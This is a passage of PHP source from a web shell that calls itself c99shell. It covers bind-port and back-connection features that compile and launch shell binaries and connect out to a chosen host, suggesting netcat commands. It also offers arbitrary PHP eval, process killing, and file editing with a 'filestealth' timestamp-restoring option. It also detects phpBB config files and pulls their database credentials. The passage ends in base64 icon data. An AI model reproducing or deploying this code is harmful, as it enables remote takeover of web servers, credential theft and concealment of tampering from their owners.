     $v[1] = str_replace("//","/",$v[1]);
     $retbind = myshellexec($v[1]." &gt; /dev/null &");
     sleep(5);
     $sock = fsockopen("localhost",$bind["port"],$errno,$errstr,5);
     if (!$sock) {echo "I can't connect to localhost:".$bind["port"]."! I think you should configure your firewall.";}
     else {echo "Binding... ok! Connect to &lt;b&gt;".$SERVER_ADDR.":".$bind["port"]."&lt;/b&gt;! You should use NetCat&copy;, run \"&lt;b&gt;nc -v ".$SERVER_ADDR." ".$bind["port"]."&lt;/b&gt;\"!&lt;center&gt;&lt;a href=\"".$surl."act=ps_aux&grep=".basename($binpath)."\"&gt;&lt;u&gt;View binder's process&lt;/u&gt;&lt;/a&gt;&lt;/center&gt;";}
    }
    echo "&lt;br&gt;";
   }
  }
  if (!empty($bcsubmit))
  {
   echo "&lt;b&gt;Result of back connection:&lt;/b&gt;&lt;br&gt;";
   $v = $bcsrcs[$bc["src"]];
   if (empty($v)) {echo "Unknown file!&lt;br&gt;";}
   else
   {
    $srcpath = $tmpdir.$bc["src"];
    $w = explode(".",$bc["src"]);
    $ext = $w[count($w)-1];
    unset($w[count($w)-1]);
    $binpath = $tmpdir.join(".",$w);
    if ($ext == "pl") {$binpath = $srcpath;}
    @unlink($srcpath);
    $fp = fopen($srcpath,"ab+");
    if (!$fp) {echo "Can't write sources to \"".$srcpath."\"!&lt;br&gt;";}
    else
    {
     $data = base64_decode($bndsrcs[$bind[src]]);
     fwrite($fp,$data,strlen($data));
     fclose($fp);
     if ($ext == "c") {$retgcc = myshellexec("gcc -o ".$binpath." ".$srcpath); @unlink($srcpath);}
     $v[1] = str_replace("%path",$binpath,$v[1]);
     $v[1] = str_replace("%host",$bc["host"],$v[1]);
     $v[1] = str_replace("%port",$bc["port"],$v[1]);
     $v[1] = str_replace("//","/",$v[1]);
     $retbind = myshellexec($v[1]." &gt; /dev/null &");
     echo "Now script try connect to ".$bc["host"].":".$bc["port"]."...&lt;br&gt;";
    }
   }
  }
  ?>&lt;b&gt;Binding port:&lt;/b&gt;&lt;br&gt;&lt;form method="POST"&gt;&lt;input type="hidden" name="act" value="bind"&gt;&lt;input type="hidden" name="d" value="<?php echo $d; ?>"&gt;Port: &lt;input type="text" name="bind[port]" value="<?php echo htmlspecialchars($bind["port"]); ?>"&gt;&nbsp;Password: &lt;input type="text" name="bind[pass]" value="<?php echo htmlspecialchars($bind["pass"]); ?>"&gt;&nbsp;&lt;select name="bind[src]"&gt;<?php
foreach($bndportsrcs as $k=&gt;$v) {echo "&lt;option value=\"".$k."\""; if ($k == $bind["src"]) {echo " selected";} echo "&gt;".$v[0]."&lt;/option&gt;";}
?>&lt;/select&gt;&nbsp;&lt;input type="submit" name="bindsubmit" value="Bind"&gt;&lt;/form&gt;
&lt;b&gt;Back connection:&lt;/b&gt;&lt;br&gt;&lt;form method="POST"&gt;&lt;input type="hidden" name="act" value="bind"&gt;&lt;input type="hidden" name="d" value="<?php echo $d; ?>"&gt;HOST: &lt;input type="text" name="bc[host]" value="<?php echo htmlspecialchars($bc["host"]); ?>"&gt;&nbsp;Port: &lt;input type="text" name="bc[port]" value="<?php echo htmlspecialchars($bc["port"]); ?>"&gt;&nbsp;&lt;select name="bc[src]"&gt;<?php
foreach($bcsrcs as $k=&gt;$v) {echo "&lt;option value=\"".$k."\""; if ($k == $bc["src"]) {echo " selected";} echo "&gt;".$v[0]."&lt;/option&gt;";}
?>&lt;/select&gt;&nbsp;&lt;input type="submit" name="bcsubmit" value="Connect"&gt;&lt;/form&gt;
Click "Connect" only after open port for it. You should use NetCat&copy;, run "&lt;b&gt;nc -l -n -v -p &lt;port&gt;&lt;/b&gt;"!<?php
 }
}
if ($act == "ps_aux")
{
 echo "&lt;b&gt;Processes:&lt;/b&gt;&lt;br&gt;";
 if ($win) {echo "This function not work in Windows!&lt;br&gt;&lt;br&gt;";}
 else
 {
  if ($pid)
  {
   if (!$sig) {$sig = 9;}
   echo "Sending signal ".$sig." to #".$pid."... ";
   $ret = posix_kill($pid,$sig);
   if ($ret) {echo "ok. he is dead, amen.";}
   else {echo "ERROR.";}
  }
  $ret = myshellexec("ps -aux");
  if (!$ret) {echo "Can't execute \"ps -aux\"!";}
  else
  {
   $ret = htmlspecialchars($ret);
   while (ereg("  ",$ret)) {$ret = str_replace("  "," ",$ret);}
   $stack = explode("\n",$ret);
   $head = explode(" ",$stack[0]);
   unset($stack[0]);
   if (empty($ps_aux_sort)) {$ps_aux_sort = $sort_default;}
   if (!is_numeric($ps_aux_sort[0])) {$ps_aux_sort[0] = 0;}
   $k = $ps_aux_sort[0];
   if ($ps_aux_sort[1] != "a") {$y = "&lt;a href=\"".$surl."act=".$dspact."&d=".urlencode($d)."&ps_aux_sort=".$k."a\"&gt;&lt;img src=\"".$surl."act=img&img=sort_desc\" height=\"9\" width=\"14\" border=\"0\"&gt;&lt;/a&gt;";}
   else {$y = "&lt;a href=\"".$surl."act=".$dspact."&d=".urlencode($d)."&ps_aux_sort=".$k."d\"&gt;&lt;img src=\"".$surl."act=img&img=sort_asc\" height=\"9\" width=\"14\" border=\"0\"&gt;&lt;/a&gt;";}
   for($i=0;$i&lt;count($head);$i++)
   {
    if ($i != $k) {$head[$i] = "&lt;a href=\"".$surl."act=".$dspact."&d=".urlencode($d)."&ps_aux_sort=".$i.$ps_aux_sort[1]."\"&gt;&lt;b&gt;".$head[$i]."&lt;/b&gt;&lt;/a&gt;";}
   }
   $prcs = array();
   foreach ($stack as $line)
   {
    if (!empty($line))
	{
	 echo "&lt;tr&gt;";
     $line = explode(" ",$line);
     $line[10] = join(" ",array_slice($line,10,count($line)));
     $line = array_slice($line,0,11);
     if ($line[0] == get_current_user()) {$line[0] = "&lt;font color=\"green\"&gt;".$line[0]."&lt;/font&gt;";}
     $line[] = "&lt;a href=\"".$surl."act=ps_aux&d=".urlencode($d)."&pid=".$line[1]."&sig=9\"&gt;&lt;u&gt;KILL&lt;/u&gt;&lt;/a&gt;";
     $prcs[] = $line;
     echo "&lt;/tr&gt;";
    }
   }
   $head[$k] = "&lt;b&gt;".$head[$k]."&lt;/b&gt;".$y;
   $head[] = "&lt;b&gt;ACTION&lt;/b&gt;";
   $v = $ps_aux_sort[0];
   usort($prcs,"tabsort");
   if ($ps_aux_sort[1] == "d") {$prcs = array_reverse($prcs);}
   $tab = array();
   $tab[] = $head;
   $tab = array_merge($tab,$prcs);
   echo "&lt;TABLE height=1 cellSpacing=0 borderColorDark=#666666 cellPadding=5 width=\"100%\" bgColor=#333333 borderColorLight=#c0c0c0 border=1 bordercolor=\"#C0C0C0\"&gt;";
   foreach($tab as $k)
   {
    echo "&lt;tr&gt;";
    foreach($k as $v) {echo "&lt;td&gt;".$v."&lt;/td&gt;";}
    echo "&lt;/tr&gt;";
   }
   echo "&lt;/table&gt;";
  }
 }
}
if ($act == "eval")
{
 if (!empty($eval))
 {
  echo "&lt;b&gt;Result of execution this PHP-code&lt;/b&gt;:&lt;br&gt;";
  $tmp = ob_get_contents();
  $olddir = realpath(".");
  @chdir($d);
  if ($tmp)
  {
   ob_clean();
   eval($eval);
   $ret = ob_get_contents();
   $ret = convert_cyr_string($ret,"d","w");
   ob_clean();
   echo $tmp;
   if ($eval_txt)
   {
    $rows = count(explode("\r\n",$ret))+1;
    if ($rows &lt; 10) {$rows = 10;}
    echo "&lt;br&gt;&lt;textarea cols=\"122\" rows=\"".$rows."\" readonly&gt;".htmlspecialchars($ret)."&lt;/textarea&gt;";
   }
   else {echo $ret."&lt;br&gt;";}
  }
  else
  {
   if ($eval_txt)
   {
    echo "&lt;br&gt;&lt;textarea cols=\"122\" rows=\"15\" readonly&gt;";
    eval($eval);
    echo "&lt;/textarea&gt;";
   }
   else {echo $ret;}
  }
  @chdir($olddir);
 }
 else {echo "&lt;b&gt;Execution PHP-code&lt;/b&gt;"; if (empty($eval_txt)) {$eval_txt = true;}}
 echo "&lt;form method=\"POST\"&gt;&lt;textarea name=\"eval\" cols=\"122\" rows=\"10\"&gt;".htmlspecialchars($eval)."&lt;/textarea&gt;&lt;input type=\"hidden\" name=\"d\" value=\"".$dispd."\"&gt;&lt;br&gt;&lt;br&gt;&lt;input type=\"submit\" value=\"Execute\"&gt;&nbsp;Display in text-area&nbsp;&lt;input type=\"checkbox\" name=\"eval_txt\" value=\"1\""; if ($eval_txt) {echo " checked";} echo "&gt;&lt;/form&gt;";
}
if ($act == "f")
{
 if ((!is_readable($d.$f) or is_dir($d.$f)) and $ft != "edit")
 {
  if (file_exists($d.$f)) {echo "&lt;center&gt;&lt;b&gt;Permision denied (".htmlspecialchars($d.$f).")!&lt;/b&gt;&lt;/center&gt;";}
  else {echo "&lt;center&gt;&lt;b&gt;File does not exists (".htmlspecialchars($d.$f).")!&lt;/b&gt;&lt;br&gt;&lt;a href=\"".$surl."act=f&f=".urlencode($f)."&ft=edit&d=".urlencode($d)."&c=1\"&gt;&lt;u&gt;Create&lt;/u&gt;&lt;/a&gt;&lt;/center&gt;";}
 }
 else
 {
  $r = @file_get_contents($d.$f);
  $ext = explode(".",$f);
  $c = count($ext)-1;
  $ext = $ext[$c];
  $ext = strtolower($ext);
  $rft = "";
  foreach($ftypes as $k=&gt;$v) {if (in_array($ext,$v)) {$rft = $k; break;}}
  if (eregi("sess_(.*)",$f)) {$rft = "phpsess";}
  if (empty($ft)) {$ft = $rft;}
  $arr = array(
   array("&lt;img src=\"".$surl."act=img&img=ext_diz\" border=\"0\"&gt;","info"),
   array("&lt;img src=\"".$surl."act=img&img=ext_html\" border=\"0\"&gt;","html"),
   array("&lt;img src=\"".$surl."act=img&img=ext_txt\" border=\"0\"&gt;","txt"),
   array("Code","code"),
   array("Session","phpsess"),
   array("&lt;img src=\"".$surl."act=img&img=ext_exe\" border=\"0\"&gt;","exe"),
   array("SDB","sdb"),
   array("&lt;img src=\"".$surl."act=img&img=ext_gif\" border=\"0\"&gt;","img"),
   array("&lt;img src=\"".$surl."act=img&img=ext_ini\" border=\"0\"&gt;","ini"),
   array("&lt;img src=\"".$surl."act=img&img=download\" border=\"0\"&gt;","download"),
   array("&lt;img src=\"".$surl."act=img&img=ext_rtf\" border=\"0\"&gt;","notepad"),
   array("&lt;img src=\"".$surl."act=img&img=change\" border=\"0\"&gt;","edit")
  );
  echo "&lt;b&gt;Viewing file:&nbsp;&nbsp;&nbsp;&nbsp;&lt;img src=\"".$surl."act=img&img=ext_".$ext."\" border=\"0\"&gt;&nbsp;".$f." (".view_size(filesize($d.$f)).") &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;".view_perms_color($d.$f)."&lt;/b&gt;&lt;br&gt;Select action/file-type:&lt;br&gt;";
  foreach($arr as $t)
  {
   if ($t[1] == $rft) {echo " &lt;a href=\"".$surl."act=f&f=".urlencode($f)."&ft=".$t[1]."&d=".urlencode($d)."\"&gt;&lt;font color=\"green\"&gt;".$t[0]."&lt;/font&gt;&lt;/a&gt;";}
   elseif ($t[1] == $ft) {echo " &lt;a href=\"".$surl."act=f&f=".urlencode($f)."&ft=".$t[1]."&d=".urlencode($d)."\"&gt;&lt;b&gt;&lt;u&gt;".$t[0]."&lt;/u&gt;&lt;/b&gt;&lt;/a&gt;";}
   else {echo " &lt;a href=\"".$surl."act=f&f=".urlencode($f)."&ft=".$t[1]."&d=".urlencode($d)."\"&gt;&lt;b&gt;".$t[0]."&lt;/b&gt;&lt;/a&gt;";}
   echo " (&lt;a href=\"".$surl."act=f&f=".urlencode($f)."&ft=".$t[1]."&white=1&d=".urlencode($d)."\" target=\"_blank\"&gt;+&lt;/a&gt;) |";
  }
  echo "&lt;hr size=\"1\" noshade&gt;";
  if ($ft == "info")
  {
   echo "&lt;b&gt;Information:&lt;/b&gt;&lt;table border=0 cellspacing=1 cellpadding=2&gt;&lt;tr&gt;&lt;td&gt;&lt;b&gt;Path&lt;/b&gt;&lt;/td&gt;&lt;td&gt; ".$d.$f."&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;b&gt;Size&lt;/b&gt;&lt;/td&gt;&lt;td&gt; ".view_size(filesize($d.$f))."&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;b&gt;MD5&lt;/b&gt;&lt;/td&gt;&lt;td&gt; ".md5_file($d.$f)."&lt;/td&gt;&lt;/tr&gt;";
   if (!$win)
   {
    echo "&lt;tr&gt;&lt;td&gt;&lt;b&gt;Owner/Group&lt;/b&gt;&lt;/td&gt;&lt;td&gt; ";      
    $tmp = posix_getpwuid(fileowner($d.$f));
    if ($tmp["name"] == "") {echo fileowner($d.$f)."/";}
    else {echo $tmp["name"]."/";}
    $tmp = posix_getgrgid(filegroup($d.$f));
    if ($tmp["name"] == "") {echo filegroup($d.$f);}
    else {echo $tmp['name'];}
   }
   echo "&lt;tr&gt;&lt;td&gt;&lt;b&gt;Perms&lt;/b&gt;&lt;/td&gt;&lt;td&gt;&lt;a href=\"".$surl."act=chmod&f=".urlencode($f)."&d=".urlencode($d)."\"&gt;".view_perms_color($d.$f)."&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;b&gt;Create time&lt;/b&gt;&lt;/td&gt;&lt;td&gt; ".date("d/m/Y H:i:s",filectime($d.$f))."&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;b&gt;Access time&lt;/b&gt;&lt;/td&gt;&lt;td&gt; ".date("d/m/Y H:i:s",fileatime($d.$f))."&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;b&gt;MODIFY time&lt;/b&gt;&lt;/td&gt;&lt;td&gt; ".date("d/m/Y H:i:s",filemtime($d.$f))."&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;br&gt;";
   $fi = fopen($d.$f,"rb");
   if ($fi)
   {
    if ($fullhexdump) {echo "&lt;b&gt;FULL HEXDUMP&lt;/b&gt;"; $str = fread($fi,filesize($d.$f));}
    else {echo "&lt;b&gt;HEXDUMP PREVIEW&lt;/b&gt;"; $str = fread($fi,$hexdump_lines*$hexdump_rows);}
    $n = 0;
    $a0 = "00000000&lt;br&gt;";
    $a1 = "";
    $a2 = "";
    for ($i=0; $i&lt;strlen($str); $i++)
    {
     $a1 .= sprintf("%02X",ord($str[$i]))." ";
     switch (ord($str[$i]))
     {
      case 0:  $a2 .= "&lt;font&gt;0&lt;/font&gt;"; break;
      case 32: 
      case 10:
      case 13: $a2 .= "&nbsp;"; break;
      default: $a2 .= htmlspecialchars($str[$i]);
     }
     $n++;
     if ($n == $hexdump_rows)
     {
      $n = 0;
      if ($i+1 &lt; strlen($str)) {$a0 .= sprintf("%08X",$i+1)."&lt;br&gt;";}
      $a1 .= "&lt;br&gt;";
      $a2 .= "&lt;br&gt;";
     }
    }
    //if ($a1 != "") {$a0 .= sprintf("%08X",$i)."&lt;br&gt;";}
    echo "&lt;table border=0 bgcolor=#666666 cellspacing=1 cellpadding=4&gt;&lt;tr&gt;&lt;td bgcolor=#666666&gt;".$a0."&lt;/td&gt;&lt;td bgcolor=000000&gt;".$a1."&lt;/td&gt;&lt;td bgcolor=000000&gt;".$a2."&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;br&gt;";
   }
   $encoded = "";
   if ($base64 == 1)
   {
    echo "&lt;b&gt;Base64 Encode&lt;/b&gt;&lt;br&gt;";
    $encoded = base64_encode(file_get_contents($d.$f));
   }
   elseif($base64 == 2)
   {
    echo "&lt;b&gt;Base64 Encode + Chunk&lt;/b&gt;&lt;br&gt;";
    $encoded = chunk_split(base64_encode(file_get_contents($d.$f)));
   }
   elseif($base64 == 3)
   {
    echo "&lt;b&gt;Base64 Encode + Chunk + Quotes&lt;/b&gt;&lt;br&gt;";
    $encoded = base64_encode(file_get_contents($d.$f));
    $encoded = substr(preg_replace("!.{1,76}!","'\&#92;&#48;'.\n",$encoded),0,-2);
   }
   elseif($base64 == 4)
   {
    $text = file_get_contents($d.$f);
    $encoded = base64_decode($text);
    echo "&lt;b&gt;Base64 Decode";
    if (base64_encode($encoded) != $text) {echo " (failed)";}
    echo "&lt;/b&gt;&lt;br&gt;";
   }
   if (!empty($encoded))
   {
    echo "&lt;textarea cols=80 rows=10&gt;".htmlspecialchars($encoded)."&lt;/textarea&gt;&lt;br&gt;&lt;br&gt;";
   }
   echo "&lt;b&gt;HEXDUMP:&lt;/b&gt;&lt;nobr&gt; [&lt;a href=\"".$surl."act=f&f=".urlencode($f)."&ft=info&fullhexdump=1&d=".urlencode($d)."\"&gt;Full&lt;/a&gt;] [&lt;a href=\"".$surl."act=f&f=".urlencode($f)."&ft=info&d=".urlencode($d)."\"&gt;Preview&lt;/a&gt;]&lt;br&gt;&lt;b&gt;Base64: &lt;/b&gt;
&lt;nobr&gt;[&lt;a href=\"".$surl."act=f&f=".urlencode($f)."&ft=info&base64=1&d=".urlencode($d)."\"&gt;Encode&lt;/a&gt;]&nbsp;&lt;/nobr&gt;
&lt;nobr&gt;[&lt;a href=\"".$surl."act=f&f=".urlencode($f)."&ft=info&base64=2&d=".urlencode($d)."\"&gt;+chunk&lt;/a&gt;]&nbsp;&lt;/nobr&gt;
&lt;nobr&gt;[&lt;a href=\"".$surl."act=f&f=".urlencode($f)."&ft=info&base64=3&d=".urlencode($d)."\"&gt;+chunk+quotes&lt;/a&gt;]&nbsp;&lt;/nobr&gt;
&lt;nobr&gt;[&lt;a href=\"".$surl."act=f&f=".urlencode($f)."&ft=info&base64=4&d=".urlencode($d)."\"&gt;Decode&lt;/a&gt;]&nbsp;&lt;/nobr&gt;
&lt;P&gt;";
  }
  elseif ($ft == "html")
  {
   if ($white) {@ob_clean();}
   echo $r;
   if ($white) {exit;}
  }
  elseif ($ft == "txt") {echo "&lt;pre&gt;".htmlspecialchars($r)."&lt;/pre&gt;";}
  elseif ($ft == "ini") {echo "&lt;pre&gt;"; var_dump(parse_ini_file($d.$f,true)); echo "&lt;/pre&gt;";}
  elseif ($ft == "phpsess")
  {
   echo "&lt;pre&gt;";
   $v = explode("|",$r);
   echo $v[0]."&lt;br&gt;";
   var_dump(unserialize($v[1]));
   echo "&lt;/pre&gt;";
  }
  elseif ($ft == "exe")
  {
   $ext = explode(".",$f);
   $c = count($ext)-1;
   $ext = $ext[$c];
   $ext = strtolower($ext);
   $rft = "";
   foreach($exeftypes as $k=&gt;$v)
   {
    if (in_array($ext,$v)) {$rft = $k; break;}
   }
   $cmd = str_replace("%f%",$f,$rft);
   echo "&lt;b&gt;Execute file:&lt;/b&gt;&lt;form action=\"".$surl."act=cmd\" method=\"POST\"&gt;&lt;input type=\"text\" name=\"cmd\" value=\"".htmlspecialchars($cmd)."\" size=\"".(strlen($cmd)+2)."\"&gt;&lt;br&gt;Display in text-area&lt;input type=\"checkbox\" name=\"cmd_txt\" value=\"1\" checked&gt;&lt;input type=\"hidden\" name=\"d\" value=\"".htmlspecialchars($d)."\"&gt;&lt;br&gt;&lt;input type=\"submit\" name=\"submit\" value=\"Execute\"&gt;&lt;/form&gt;";
  }
  elseif ($ft == "sdb") {echo "&lt;pre&gt;"; var_dump(unserialize(base64_decode($r))); echo "&lt;/pre&gt;";}
  elseif ($ft == "code")
  {
   if (ereg("phpBB 2.(.*) auto-generated config file",$r))
   {
    $arr = explode("\n",$r);
    if (count($arr == 18))
    {
     include($d.$f);
     echo "&lt;b&gt;phpBB configuration is detected in this file!&lt;br&gt;";
     if ($dbms == "mysql4") {$dbms = "mysql";}
     if ($dbms == "mysql") {echo "&lt;a href=\"".$surl."act=sql&sql_server=".htmlspecialchars($dbhost)."&sql_login=".htmlspecialchars($dbuser)."&sql_passwd=".htmlspecialchars($dbpasswd)."&sql_port=3306&sql_db=".htmlspecialchars($dbname)."\"&gt;&lt;b&gt;&lt;u&gt;Connect to DB&lt;/u&gt;&lt;/b&gt;&lt;/a&gt;&lt;br&gt;&lt;br&gt;";}
     else {echo "But, you can't connect to forum sql-base, because db-software=\"".$dbms."\" is not supported by c99shell. Please, report us for fix.";}
     echo "Parameters for manual connect:&lt;br&gt;";
     $cfgvars = array("dbms"=&gt;$dbms,"dbhost"=&gt;$dbhost,"dbname"=&gt;$dbname,"dbuser"=&gt;$dbuser,"dbpasswd"=&gt;$dbpasswd);
     foreach ($cfgvars as $k=&gt;$v) {echo htmlspecialchars($k)."='".htmlspecialchars($v)."'&lt;br&gt;";}
     echo "&lt;/b&gt;&lt;hr size=\"1\" noshade&gt;";
    }
   }
   echo "&lt;div style=\"border : 0px solid #FFFFFF; padding: 1em; margin-top: 1em; margin-bottom: 1em; margin-right: 1em; margin-left: 1em; background-color: ".$highlight_background .";\"&gt;";
   if (!empty($white)) {@ob_clean();}
   highlight_file($d.$f);
   if (!empty($white)) {exit;}
   echo "&lt;/div&gt;";
  }
  elseif ($ft == "download")
  {
   @ob_clean();
   header("Content-type: application/octet-stream");
   header("Content-length: ".filesize($d.$f));
   header("Content-disposition: attachment; filename=\"".$f."\";");
   echo $r;
   exit;
  }
  elseif ($ft == "notepad")
  {
   @ob_clean();
   header("Content-type: text/plain");
   header("Content-disposition: attachment; filename=\"".$f.".txt\";");
   echo($r);
   exit;
  }
  elseif ($ft == "img")
  {
   $inf = getimagesize($d.$f);
   if (!$white)
   {
    if (empty($imgsize)) {$imgsize = 20;}
    $width = $inf[0]/100*$imgsize;
    $height = $inf[1]/100*$imgsize;
    echo "&lt;center&gt;&lt;b&gt;Size:&lt;/b&gt;&nbsp;";
    $sizes = array("100","50","20");
    foreach ($sizes as $v)
    {
     echo "&lt;a href=\"".$surl."act=f&f=".urlencode($f)."&ft=img&d=".urlencode($d)."&imgsize=".$v."\"&gt;";
     if ($imgsize != $v ) {echo $v;}
     else {echo "&lt;u&gt;".$v."&lt;/u&gt;";}
     echo "&lt;/a&gt;&nbsp;&nbsp;&nbsp;";
    }
    echo "&lt;br&gt;&lt;br&gt;&lt;img src=\"".$surl."act=f&f=".urlencode($f)."&ft=img&white=1&d=".urlencode($d)."\" width=\"".$width."\" height=\"".$height."\" border=\"1\"&gt;&lt;/center&gt;";
   }
   else
   {
    @ob_clean();
    $ext = explode($f,".");
    $ext = $ext[count($ext)-1];
    header("Content-type: ".$inf["mime"]); 
    readfile($d.$f);
    exit;
   }
  }
  elseif ($ft == "edit")
  {
   if (!empty($submit))
   {
    if ($filestealth) {$stat = stat($d.$f);}
    $fp = fopen($d.$f,"w");
    if (!$fp) {echo "&lt;b&gt;Can't write to file!&lt;/b&gt;";}
    else
    {
     echo "&lt;b&gt;Saved!&lt;/b&gt;";
     fwrite($fp,$edit_text);
     fclose($fp);
     if ($filestealth) {touch($d.$f,$stat[9],$stat[8]);}
     $r = $edit_text;
    }
   }
   $rows = count(explode("\r\n",$r));
   if ($rows &lt; 10) {$rows = 10;}
   if ($rows &gt; 30) {$rows = 30;}
   echo "&lt;form method=\"POST\"&gt;&lt;input type=\"submit\" name=\"submit\" value=\"Save\"&gt;&nbsp;&lt;input type=\"reset\" value=\"Reset\"&gt;&nbsp;&lt;input type=\"button\" onclick=\"location.href='".addslashes($surl."act=ls&d=".substr($d,0,strlen($d)-1))."';\" value=\"Back\"&gt;&lt;br&gt;&lt;textarea name=\"edit_text\" cols=\"122\" rows=\"".$rows."\"&gt;".htmlspecialchars($r)."&lt;/textarea&gt;&lt;/form&gt;";
  }
  elseif (!empty($ft)) {echo "&lt;center&gt;&lt;b&gt;Manually selected type is incorrect. If you think, it is mistake, please send us url and dump of \$GLOBALS.&lt;/b&gt;&lt;/center&gt;";}
  else {echo "&lt;center&gt;&lt;b&gt;Unknown extension (".$ext."), please, select type manually.&lt;/b&gt;&lt;/center&gt;";}
 }
}
}
else
{
 @ob_clean();
 $images = array(
"arrow_ltr"=&gt;
"R0lGODlhJgAWAIAAAAAAAP///yH5BAUUAAEALAAAAAAmABYAAAIvjI+py+0PF4i0gVvzuVxXDnoQ".
"SIrUZGZoerKf28KjPNPOaku5RfZ+uQsKh8RiogAAOw==",
"back"=&gt;
"R0lGODlhFAAUAKIAAAAAAP///93d3cDAwIaGhgQEBP///wAAACH5BAEAAAYALAAAAAAUABQAAAM8".
"aLrc/jDKSWWpjVysSNiYJ4CUOBJoqjniILzwuzLtYN/3zBSErf6kBW+gKRiPRghPh+EFK0mOUEqt".
"Wg0JADs=",
"buffer"=&gt;
"R0lGODlhFAAUAKIAAAAAAP////j4+N3d3czMzLKysoaGhv///yH5BAEAAAcALAAAAAAUABQAAANo".
"eLrcribG90y4F1Amu5+NhY2kxl2CMKwrQRSGuVjp4LmwDAWqiAGFXChg+xhnRB+ptLOhai1crEmD".
"Dlwv4cEC46mi2YgJQKaxsEGDFnnGwWDTEzj9jrPRdbhuG8Cr/2INZIOEhXsbDwkAOw==",
"change"=&gt;
"R0lGODlhFAAUAMQfAL3hj7nX+pqo1ejy/f7YAcTb+8vh+6FtH56WZtvr/RAQEZecx9Ll/PX6/v3+".
"/3eHt6q88eHu/ZkfH3yVyIuQt+72/kOm99fo/P8AZm57rkGS4Hez6pil9oep3GZmZv///yH5BAEA".
"AB8ALAAAAAAUABQAAAWf4CeOZGme6NmtLOulX+c4TVNVQ7e9qFzfg4HFonkdJA5S54cbRAoFyEOC".
"wSiUtmYkkrgwOAeA5zrqaLldBiNMIJeD266XYTgQDm5Rx8mdG+oAbSYdaH4Ga3c8JBMJaXQGBQgA".
"CHkjE4aQkQ0AlSITan+ZAQqkiiQPj1AFAaMKEKYjD39QrKwKAa8nGQK8Agu/CxTCsCMexsfIxjDL".
"zMshADs=",
"delete"=&gt;
"R0lGODlhFAAUAOZZAPz8/NPFyNgHLs0YOvPz8/b29sacpNXV1fX19cwXOfDw8Kenp/n5+etgeunp".
"6dcGLMMpRurq6pKSktvb2+/v7+1wh3R0dPnP17iAipxyel9fX7djcscSM93d3ZGRkeEsTevd4LCw".
"sGRkZGpOU+IfQ+EQNoh6fdIcPeHh4YWFhbJQYvLy8ui+xm5ubsxccOx8kcM4UtY9WeAdQYmJifWv".
"vHx8fMnJycM3Uf3v8rRue98ONbOzs9YFK5SUlKYoP+Tk5N0oSufn57ZGWsQrR9kIL5CQkOPj42Vl".
"ZeAPNudAX9sKMPv7+15QU5ubm39/f8e5u4xiatra2ubKz8PDw+pfee9/lMK0t81rfd8AKf///wAA".
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA".
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACH5".
"BAEAAFkALAAAAAAUABQAAAesgFmCg4SFhoeIhiUfIImIMlgQB46GLAlYQkaFVVhSAIZLT5cbEYI4".
"STo5MxOfhQwBA1gYChckQBk1OwiIALACLkgxJilTBI69RFhDFh4HDJRZVFgPPFBR0FkNWDdMHA8G".
"BZTaMCISVgMC4IkVWCcaPSi96OqGNFhKI04dgr0QWFcKDL3A4uOIjVZZABxQIWDBLkIEQrRoQsHQ".
"jwVFHBgiEGQFIgQasYkcSbJQIAA7",
"download"=&gt;
"R0lGODlhFAAUALMIAAD/AACAAIAAAMDAwH9/f/8AAP///wAAAP///wAAAAAAAAAAAAAAAAAAAAAA".
"AAAAACH5BAEAAAgALAAAAAAUABQAAAROEMlJq704UyGOvkLhfVU4kpOJSpx5nF9YiCtLf0SuH7pu".
"EYOgcBgkwAiGpHKZzB2JxADASQFCidQJsMfdGqsDJnOQlXTP38przWbX3qgIADs=",
"forward"=&gt;
"R0lGODlhFAAUAPIAAAAAAP///93d3cDAwIaGhgQEBP///wAAACH5BAEAAAYALAAAAAAUABQAAAM8".
"aLrc/jDK2Qp9xV5WiN5G50FZaRLD6IhE66Lpt3RDbd9CQFSE4P++QW7He7UKPh0IqVw2l0RQSEqt".
"WqsJADs=",
"home"=&gt;
"R0lGODlhFAAUALMAAAAAAP///+rq6t3d3czMzLKysoaGhmZmZgQEBP///wAAAAAAAAAAAAAAAAAA".
"AAAAACH5BAEAAAkALAAAAAAUABQAAAR+MMk5TTWI6ipyMoO3cUWRgeJoCCaLoKO0mq0ZxjNSBDWS".
"krqAsLfJ7YQBl4tiRCYFSpPMdRRCoQOiL4i8CgZgk09WfWLBYZHB6UWjCequwEDHuOEVK3QtgN/j".
"VwMrBDZvgF+ChHaGeYiCBQYHCH8VBJaWdAeSl5YiW5+goBIRADs=",
"mode"=&gt;
"R0lGODlhHQAUALMAAAAAAP///6CgpN3d3czMzIaGhmZmZl9fX////wAAAAAAAAAAAAAAAAAAAAAA".
"AAAAACH5BAEAAAgALAAAAAAdABQAAASBEMlJq70461m6/+AHZMUgnGiqniNWHHAsz3F7FUGu73xO".
"2BZcwGDoEXk/Uq4ICACeQ6fzmXTlns0ddle99b7cFvYpER55Z10Xy1lKt8wpoIsACrdaqBpYEYK/".
"dH1LRWiEe0pRTXBvVHwUd3o6eD6OHASXmJmamJUSY5+gnxujpBIRADs=",
"refresh"=&gt;
"R0lGODlhEQAUALMAAAAAAP////Hx8erq6uPj493d3czMzLKysoaGhmZmZl9fXwQEBP///wAAAAAA".
"AAAAACH5BAEAAAwALAAAAAARABQAAAR1kMlJq0Q460xR+GAoIMvkheIYlMyJBkJ8lm6YxMKi6zWY".
"3AKCYbjo/Y4EQqFgKIYUh8EvuWQ6PwPFQJpULpunrXZLrYKx20G3oDA7093Esv19q5O/woFu9ZAJ".
"R3lufmWCVX13h3KHfWWMjGBDkpOUTTuXmJgRADs=",
"search"=&gt;
"R0lGODlhFAAUALMAAAAAAP///+rq6t3d3czMzMDAwLKysoaGhnd3d2ZmZl9fX01NTSkpKQQEBP//".
